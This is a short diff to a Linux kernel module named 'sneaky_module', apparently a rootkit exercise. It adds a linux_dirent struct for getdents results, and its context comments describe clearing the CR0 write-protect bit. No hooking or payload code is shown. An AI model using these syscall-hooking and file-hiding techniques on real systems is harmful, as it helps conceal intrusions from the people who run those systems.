@@ -9,6 +9,17 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
+//getdents will fill in an array of “struct linux_dirent” objects, one for each file or directory found within a directory. 
+//int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+
+struct linux_dirent {
+            u64            d_ino;
+            s64            d_off;
+            unsigned short d_reclen;
+            char           d_name[BUFFLEN];
+};
+
+
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -102,4 +113,3 @@ static void exit_sneaky_module(void)
 
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
-
